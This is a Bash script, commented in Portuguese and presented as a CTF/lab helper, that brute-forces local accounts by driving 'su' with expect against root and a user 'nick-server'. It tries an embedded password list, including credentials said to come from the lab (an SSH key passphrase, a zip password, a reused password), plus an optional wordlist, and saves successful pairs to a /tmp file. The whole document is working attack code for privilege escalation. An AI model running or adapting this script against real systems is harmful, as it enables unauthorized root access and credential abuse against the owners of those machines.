#!/usr/bin/env bash
# su spray helper (CTF/lab): testa lista de senhas contra usuarios locais via expect.
# Uso:
#   bash su_password_spray.sh
#   bash su_password_spray.sh --wordlist /caminho/old-passwds --users "root nick-server"
#   bash su_password_spray.sh --users "root" --stop-on-hit
#
# Observacoes:
# - Requer expect instalado no host alvo.
# - Nao usa sudo; apenas automatiza tentativas de "su - <user> -c id".

set -euo pipefail

WORDLIST=""
USERS="root nick-server"
STOP_ON_HIT=0
TIMEOUT_SECS=5

# Senhas embutidas (inclui as encontradas no lab):
# - 424242   (passphrase da key SSH)
# - crazycat (senha do Backup.zip)
# - ZeqlcR2!4gN (credencial reutilizada)
EMBEDDED_PASSWORDS=(
  "424242"
  "crazycat"
  "ZeqlcR2!4gN"
  "nickj"
  "nick-server"
  "root"
  "admin"
  "password"
  "123456"
)

usage() {
  cat <<'EOF'
Uso:
  su_password_spray.sh [--wordlist <arquivo>] [--users "root nick-server"] [--stop-on-hit] [--timeout 5]

Opcoes:
  --wordlist <arquivo>   Arquivo com 1 senha por linha (opcional, soma com embutidas).
  --users "u1 u2"        Usuarios alvo separados por espaco (default: "root nick-server").
  --stop-on-hit          Para ao primeiro sucesso.
  --timeout <seg>        Timeout por tentativa (default: 5).
EOF
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    --wordlist) WORDLIST="${2:-}"; shift 2 ;;
    --users) USERS="${2:-}"; shift 2 ;;
    --stop-on-hit) STOP_ON_HIT=1; shift ;;
    --timeout) TIMEOUT_SECS="${2:-5}"; shift 2 ;;
    -h|--help) usage; exit 0 ;;
    *) echo "[!] Opcao invalida: $1" >&2; usage; exit 1 ;;
  esac
done

if [[ -n "${WORDLIST}" && ! -f "${WORDLIST}" ]]; then
  echo "[!] Arquivo de --wordlist nao existe: ${WORDLIST}" >&2
  exit 1
fi

if ! command -v expect >/dev/null 2>&1; then
  echo "[!] expect nao encontrado. Sem expect, 'su' nao e automatizavel com confianca." >&2
  echo "    Instale expect ou teste manualmente: su - root / su - nick-server" >&2
  exit 1
fi

TMP_OUT="/tmp/su_spray_hits_$$.txt"
: > "${TMP_OUT}"

PASS_FILE="/tmp/su_spray_passwords_$$.txt"
cleanup() {
  rm -f "${PASS_FILE}" 2>/dev/null || true
}
trap cleanup EXIT

# Junta embutidas + wordlist opcional e remove duplicadas preservando ordem.
printf '%s\n' "${EMBEDDED_PASSWORDS[@]}" > "${PASS_FILE}"
if [[ -n "${WORDLIST}" ]]; then
  cat "${WORDLIST}" >> "${PASS_FILE}"
fi
awk '!seen[$0]++' "${PASS_FILE}" > "${PASS_FILE}.uniq"
mv "${PASS_FILE}.uniq" "${PASS_FILE}"

echo "[*] Wordlist externa: ${WORDLIST:-<nenhuma>}"
echo "[*] Senhas embutidas: ${#EMBEDDED_PASSWORDS[@]}"
echo "[*] Total de senhas unicas: $(wc -l < "${PASS_FILE}")"
echo "[*] Usuarios: ${USERS}"
echo "[*] Timeout por tentativa: ${TIMEOUT_SECS}s"

try_su_once() {
  local user="$1"
  local pass="$2"

  expect <<EOF
    log_user 0
    set timeout ${TIMEOUT_SECS}
    spawn su - ${user} -c "id -u"
    expect {
      -re "(?i)password:" { send -- "${pass}\r" }
      timeout { exit 3 }
      eof { exit 4 }
    }
    expect {
      -re "^0\\r?\\n" { exit 0 }
      -re "^[0-9]+\\r?\\n" { exit 1 }
      -re "(?i)(authentication failure|failure)" { exit 2 }
      -re "(?i)(incorrect password|senha incorreta)" { exit 2 }
      timeout { exit 3 }
      eof { exit 4 }
    }
EOF
}

attempts=0
hits=0

while IFS= read -r password || [[ -n "$password" ]]; do
  [[ -z "$password" ]] && continue
  for user in ${USERS}; do
    attempts=$((attempts + 1))
    printf '[*] Tentando user=%s senha=%s\n' "${user}" "${password}"
    if try_su_once "${user}" "${password}"; then
      echo "[+] HIT user=${user} senha=${password}"
      echo "${user}:${password}" >> "${TMP_OUT}"
      hits=$((hits + 1))
      if [[ "${STOP_ON_HIT}" -eq 1 ]]; then
        echo "[+] stop-on-hit ativo. Encerrando."
        echo "[+] Resultado em: ${TMP_OUT}"
        exit 0
      fi
    fi
  done
done < "${PASS_FILE}"

echo
echo "[*] Tentativas: ${attempts}"
echo "[*] Hits: ${hits}"
if [[ "${hits}" -gt 0 ]]; then
  echo "[+] Credenciais encontradas:"
  cat "${TMP_OUT}"
  echo "[+] Arquivo: ${TMP_OUT}"
else
  echo "[-] Nenhum hit encontrado."
  rm -f "${TMP_OUT}" || true
fi

